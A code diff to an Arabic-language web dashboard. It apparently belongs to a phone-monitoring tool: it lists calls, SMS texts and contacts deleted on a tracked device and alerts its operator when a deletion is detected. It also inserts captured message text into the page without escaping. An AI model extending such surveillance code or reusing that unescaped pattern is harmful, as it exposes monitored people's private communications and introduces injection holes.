@@ -76,7 +76,7 @@ function checkNewDeleted(deleted) {
     if (!deleted || deleted.length === 0) return;
     if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
         const d = deleted[0];
-        const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
+        const typeName = d.deleted_type === 'call_logs' ? '📞 مكالمة محذوفة' : d.deleted_type === 'sms' ? '💬 رسالة محذوفة' : d.deleted_type === 'contacts' ? '👤 جهة محذوفة' : '🗑️ عنصر محذوف';
         showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
         const badge = document.getElementById('deletedCount');
         if (badge) {
@@ -87,7 +87,6 @@ function checkNewDeleted(deleted) {
     lastDeletedCount = deleted.length;
 }
 
-// ✅ حذف الجهاز مع 5 محاولات إعادة تحميل
 async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -103,7 +102,6 @@ async function deleteDevice() {
             document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
             document.getElementById('deviceNameDisplay').className = 'device-name-display';
             
-            // ✅ 5 محاولات
             setTimeout(() => { loadDevices(); }, 500);
             setTimeout(() => { loadDevices(); }, 1500);
             setTimeout(() => { loadDevices(); }, 3000);
@@ -223,31 +221,58 @@ function displayDeleted() {
         return;
     }
     
-    [...allDeleted].sort((a, b) => (b.deleted_at || 0) - (a.deleted_at || 0)).forEach(item => {
+    [...allDeleted].sort((a, b) => (b.timestamp || b.deleted_at || 0) - (a.timestamp || a.deleted_at || 0)).forEach(item => {
         const divItem = document.createElement('div');
         divItem.className = 'conversation-item';
         
-        if (item.type === 'deleted_call') {
+        const deletedType = item.deleted_type || item.type || '';
+        const deletedCount = item.deleted_count || item.count || 1;
+        
+        if (deletedType === 'call_logs' || deletedType === 'deleted_call') {
             divItem.innerHTML = `
                 <div class="conversation-avatar">📞</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">مكالمة محذوفة</div>
+                    <div class="conversation-name">📞 مكالمة محذوفة</div>
+                    <div class="conversation-preview">عدد المكالمات المحذوفة: ${deletedCount}</div>
                     <div class="conversation-preview">الرقم: ${item.number || 'غير معروف'}</div>
-                    <div class="conversation-preview">النوع: ${getCallType(item.call_type)} | المدة: ${formatDuration(item.duration)}</div>
-                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
+                    <div class="conversation-preview">النوع: ${getCallType(item.call_type) || '—'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                 </div>
-                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
             `;
-        } else {
+        } else if (deletedType === 'sms' || deletedType === 'deleted_sms') {
             divItem.innerHTML = `
                 <div class="conversation-avatar">💬</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">رسالة محذوفة</div>
+                    <div class="conversation-name">💬 رسالة محذوفة</div>
+                    <div class="conversation-preview">عدد الرسائل المحذوفة: ${deletedCount}</div>
                     <div class="conversation-preview">المرسل: ${item.address || 'غير معروف'}</div>
-                    <div class="conversation-preview">النص: ${item.body || ''}</div>
-                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
+                    <div class="conversation-preview">النص: ${item.body || '—'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                 </div>
-                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
+            `;
+        } else if (deletedType === 'contacts' || deletedType === 'deleted_contact') {
+            divItem.innerHTML = `
+                <div class="conversation-avatar">👤</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">👤 جهة اتصال محذوفة</div>
+                    <div class="conversation-preview">عدد الجهات المحذوفة: ${deletedCount}</div>
+                    <div class="conversation-preview">الاسم: ${item.name || 'غير معروف'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
+                </div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
+            `;
+        } else {
+            divItem.innerHTML = `
+                <div class="conversation-avatar">🗑️</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">🗑️ عنصر محذوف</div>
+                    <div class="conversation-preview">النوع: ${deletedType || 'غير معروف'}</div>
+                    <div class="conversation-preview">العدد: ${deletedCount}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.timestamp || item.deleted_at)}</div>
+                </div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
             `;
         }
         
